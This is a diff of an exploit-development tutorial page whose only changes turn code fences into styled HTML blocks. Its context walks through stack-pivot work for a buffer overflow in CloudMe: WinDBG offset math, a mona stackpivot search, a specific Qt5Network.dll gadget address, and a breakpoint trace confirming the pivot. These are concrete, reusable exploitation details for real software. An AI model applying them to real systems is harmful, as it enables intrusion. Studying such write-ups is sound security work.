@@ -778,14 +778,14 @@ Looking for A0aA in pattern of 500000 bytes
 
 <p align="justify">As we can see from the execution above, the pattern was found at position 0. Furthermore, the address <b>0x0022d470</b> we've got at the time of crash, appears to be <b>1368</b> bytes away from <b>ESP</b> when hitting the breakpoint.</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> ? 0022d470 - esp
 Evaluate expression: 1368 = 00000558
-```
+</pre>
 
 <p align="justify">So ideally, we need to find a gadget equivalent to <b>ADD ESP 558 ...POP ...POP ...RETN</b> to pivot precisely to the beginning of the payload. Nevertheless, any gadget with distance above &gt;1368 bytes will suit us. Next, in order to find a suitable stack pivot, we will use mona’s <strong>stackpivot</strong> searching functionality. At this point we will load CloudMe executable in <strong>WinDBG</strong> and then run the following command</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !py mona stackpivot -n -o -distance 1368
 Hold on...
 [+] Command used:
@@ -866,11 +866,11 @@ Hold on...
 Done
 
 [+] This mona.py action took 0:17:32.653000
-```
+</pre>
 
 <p align="justify">After a few minutes, mona will generate <b>stackpivot.txt</b> file in its output directory. Here is one gadget that will send us to the beginning of the payload</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 Stack pivots, minimum distance 1368
 ------------------------------------
 Non-SafeSEH protected pivots :
@@ -879,7 +879,7 @@ Non-SafeSEH protected pivots :
 0x6998fb2e : {pivot 1916 / 0x77c} : <strong># ADD ESP,76C # POP EBX # POP ESI # POP EDI # 
 POP EBP # RETN</strong> ** [Qt5Network.dll] ** | {PAGE_EXECUTE_WRITECOPY}  
 [..snip..]
-```
+</pre>
 
 <p align="justify">
 As said before, we need gadgets equal or above the distance of 1368 bytes. As we see above, we have found a gadget with 1916 bytes distance from the beginning of our payload. Now lets create a python script in order to provide a proof of concept.
@@ -980,19 +980,19 @@ except Exception as e:
 Now lets put a breakpoint at the address <b>0x6998fb2e</b>
 </p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000\> bp 0x6998fb2e 
 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
 0:000\> bl 
 0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
-```
+</pre>
 
 <p align="justify">
 Furthermore, lets observe the crash below. As we see, we are stepping into every instruction after we hit the first breakpoint. Then, when we reach the last gadget, we check the <b>ESP</b> register once again in order to see if we have made the right calculations.
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> g
 Breakpoint 0 hit
 eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
@@ -1039,7 +1039,7 @@ Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
 0022d6e4 65433165 33654332 43346543 65433565
 0022d6f4 37654336 43386543 66433965 31664330
 0022d704 43326643 66433366 35664334 43366643
-```
+</pre>
 
 <p align="justify">
 As we see, the <b>ESP</b> register points to <b>0x0022d694</b> which contains the pattern <b>35624334</b> (offset <b>0x224</b> from the beginning of the payload) ,which is expected considering we are jumping extra <b>548</b> bytes from the beginning of the payload ( <b>1916 - 1368</b> ).
